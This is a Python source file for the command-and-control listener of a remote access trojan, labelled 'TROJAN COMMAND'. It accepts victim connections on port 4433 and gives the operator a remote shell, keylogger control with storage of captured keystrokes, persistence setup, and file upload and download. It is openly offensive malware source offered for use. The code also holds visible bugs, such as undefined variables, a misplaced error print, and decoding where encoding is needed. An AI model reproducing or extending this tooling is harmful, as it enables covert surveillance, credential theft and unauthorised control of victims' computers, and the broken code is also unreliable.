
import os
import socket
import sys
import shlex
import base64


from pathlib import Path
from datetime import datetime

HOST = '0.0.0.0'
PORT = 4433
KEYLOGGER_PATH = 'Keylog_dumps'
DOWLOAD_PATH = 'downloads'


def print_banner():
    print("""
╔══════════════════════════════════════════════════╗
║                                                  ║
║              TROJAN COMMAND                      ║
║                  by whoami                       ║
║                                                  ║
╚══════════════════════════════════════════════════╝
""")


def print_help():
    print("""
╔══════════════════════════════════════════════════════════╗
║                  AVAILABLE COMMANDS                      ║
╚══════════════════════════════════════════════════════════╝

PERSISTENCE:
  /persistence status          - Chack persistence status
  /persistence setup           - Setup persistence

KEYLOGGER:
  /keylog status               - Check keylloger status
  /keylog start                - Start keylloger
  /keylog stop                 - Stop keylloger
  /keylog dump                 - Dump captured keys

FILE TRANSFER:
  /dowload '<remote_path>'     - Download file
  /upload '<local_file>' '<remote_path>' - Upload file

SYSTEM:
  cd <path>                    - Change directory
  /exit                        - Disconnect client
  /help                        - Show this help menu
  /clear                       - Clear screen
  hostname           - Show computer name

SHELL COMMANDS:
    Anny other command will be executed as shell command
""")


def save_dowloaded_file(data, original_filename):
    try:
        if not os.path.exists(DOWLOAD_PATH):
            os.makedirs(DOWLOAD_PATH)
        
        file_data = base64.b64decode(data.strip())
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        name, ext = os.path.splitext(original_filename)
        filename = f'{name}_{timestamp}{ext}'
        
        filepath = os.path.join(DOWLOAD_PATH, filename)
        
        with open(filepath, 'wb') as f:
            f.write(file_data)
        
        print(f'\n[+] File dowloaded: {filepath}')
        print(f'[i] Size: {len(file_data)} Bytes')
        return True
    
    except Exception as e:
        print(f'\n[-] Error saving file: {e}')
        return False


def read_file_to_upload(filepath):
    try:
        if not os.path.exists(filepath):
            print(f'[-] File not found: {filepath}')
            return None
        
        with open(filepath, 'rb') as f:
            file_data = f.read()
        
        return{
            'data': base64.b64decode(file_data).decode('utf-8'),
            'Size': len(file_data),
            'Filename': Path(filepath).name
        }
    
    except Exception as e:
        print(f'[-] Error reading file: {e}')
        return None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def save_keylog(data, filename=None):
    try:
        if not os.path.exists(KEYLOGGER_PATH):
            os.makedirs(KEYLOGGER_PATH)
    
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'keylog_{timestamp}.txt'
    
        file_path = os.path.join(KEYLOGGER_PATH, filename)
    
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(data)
    
        print(f'\n[+] Keylog saved as: {filename}')
        return True
    
    except Exception as e:
        print(f'\n[-] Error saving keylog: {e}')
        return False

def handle_client(conn,addr):
    print(f'\n[#] Client connected from {addr[0]}:{addr[1]}')
    print(f'[i] Connection estabilished as {datetime.now().strftime('%Y-%m-%d %H : %M : %S')}')
    print('[i] Type /help for available commands\n')
    
    try:
        initial_msg = conn.recv(1024).decode('utf-8', errors='ignore')
        if initial_msg:
            print(initial_msg, end='')
    
        while True:
            try:
                command = input(f'\033[1;32m{addr[0]}\033[1;30m>\033[0;0m ').strip()
                
                if not command:
                    continue
                
                if command == '/help':
                    print_help()
                    continue
                
                elif command == '/clear':
                    clear_screen()
                    print_banner()
                    print(f'[#] Connected to {addr[0]}:{addr[1]}\n')
                    continue
                
                elif command.startswith('/dowload '):
                    try:
                        parts = shlex.split(command)
                        if len(parts) < 2:
                            print(f'[-] Usage: /dowload \'<remote_path\'')
                            continue
                    
                        remote_path = parts[1]
                        
                        conn.send(f'/download {remote_path}\n'.encode())
                    
                    except ValueError:
                        print(f'[-] Invalid command syntax: {e}')
                        continue
                    
                    conn.send(command.encode() + b'\n')
                    
                    buffer = b''
                    in_file = False
                    filename = None
                    
                    conn.settimeout(10)
                    
                    while True:
                        chunck = conn.recv(4069)
                        if not chunck:
                            break
                        
                        buffer += chunck
                        
                        if b'[FILE_START]' in buffer and not in_file:
                            in_file = True
                            parts = buffer.split(b'[FILE_START]')
                            header = parts[0].decode('utf-8', errors='ignore')
                            print (header)
                            
                            for line in header.split('\n'):
                                if 'filename:' in line:
                                    filename = line.split('filename:')[1].strip()
                            
                            buffer = parts[1]
                            
                        if b'[FILE_END]' in buffer:
                            file_data = buffer.split(b'[FILE_END]')[0]
                            
                            if filename:
                                save_dowloaded_file(file_data.decode('utf-8'), filename)
                            else:
                                print('[-] Could not determine filename')
                                break
                    
                    continue
                
                elif command.startswith('/upload'):
                    try:
                        parts = shlex.split(command)
                        
                        if len(parts) < 3:
                            print('[-] Usage: /upload \'<local_file\'\'<remote_path>\'')
                            continue
                        
                        local_file = parts[1]
                        remote_path = parts[2]
                        
                        file_info = read_file_to_upload(local_file)
                        
                        if not file_info:
                            continue
                        
                        print(f'[+] Uploading {file_info['filename']}({file_info['size']} bytes)...')
                        
                        conn.send(f'/upload {remote_path}\n'.encode())
                        
                    except ValueError as e:
                        print(f'[-] Invalid command syntax: {e}')
                        continue
                    
                    response = conn.recv(1024).decode('utf-8', errors='ignore')
                    print(response, end='')
                    
                    if 'Ready to receive' in response:
                        conn.send(file_info['data'].encode())
                        conn.send(b'[UPLOAD_END]\n')
                        
                        conn.settimeout(5)
                        result = conn.recv(4096).decode('utf-8', errors='ignore')
                        print(result, end='')
                        
                    continue
                    
                conn.send(command.encode() + b'\n')
                
                if command == '/exit':
                    print('\n[!] Client disconnected ')
                    break
                
                response = b''
                conn.settimeout(2.0)
                
                while True:
                    try:
                        chunck = conn.recv(4096)
                        if not chunck:
                            break
                            
                        response += chunck
                        
                        if response.endswith(b'\n\n'):
                            break
                    
                    except socket.timeout:
                        break
                    
                if response:
                    decoded = response.decode('utf-8', errors='ignote')
                
                    if '[AUTO-SEND]' in decoded:
                        keylog_content = decoded.split('[AUTO-SEND]')[1].strip()
                        save_keylog(keylog_content)
                    elif command == '/keylog dump':
                        print(decoded)
                        
                        if  '[+] Keyog captured' in decoded:
                            save = input('Save this keylog? (y/n) ').lower()
                            if save == 'y':
                                save_keylog(decoded)
                        else:
                            print(decoded, end='')
                else:
                    print('[!] No response from client')
            
            except KeyboardInterrupt:
                print('\n[!] Interruped. sending exit command...')
                conn.send(b'/exit\n')
                break
            
            except Exception as e:
                    print(f'[-] Connection error: {e}')
        
    except Exception as e:
        print(f'[-] Connection error: {e}')
    
    finally:
        conn.close()
        print('\n[!] Connection closed')

def start_listener():
    print_banner()
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
    
        print(f'[-] Listener error: {e}')
        print(f'[i] Waiting for connections...\n')
        
        while True:
            try:
                conn, addr = s.accept()
                handle_client(conn, addr)
            
                print('\n' + '='*60)
                choice = input('Wait for new connection? (y/n): ').lower()
                if choice != 'y':
                    print('[!] Shutting down listener...')
                    break
            
                print(f'\n[i] Waiting for connections ...\n')
            
            except KeyboardInterrupt:
                print('\n[!] Interruped by user')
                break
    except Exception as e:
        print(f'[-] Listener error: {e}')
        
    finally:
        s.close()
        print('[!] Listener stopped')


if __name__ == '__main__':
    try:
        start_listener()
    
    except KeyboardInterrupt:
        print('\n[!] Exiting...')
        sys.exit(0)